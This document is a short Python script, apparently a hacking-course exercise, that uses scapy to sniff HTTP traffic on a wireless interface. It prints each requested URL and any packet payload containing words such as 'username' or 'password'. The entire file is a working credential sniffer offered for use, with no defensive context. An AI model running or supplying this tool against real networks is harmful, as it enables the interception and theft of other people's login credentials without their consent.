#!/bin/python3
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=packet_function)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_username_pass(packet):
    if packet.haslayer(scapy.Raw) and packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname", "login", "password", "pass"]
        for key in keywords:
            if key in load:
                return load


def packet_function(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request-> " + url)

        login = get_username_pass(packet)
        if login:
            print("\n\n[+] Possible Username/Password -> " + login + "\n\n")
    

sniff("wlan0")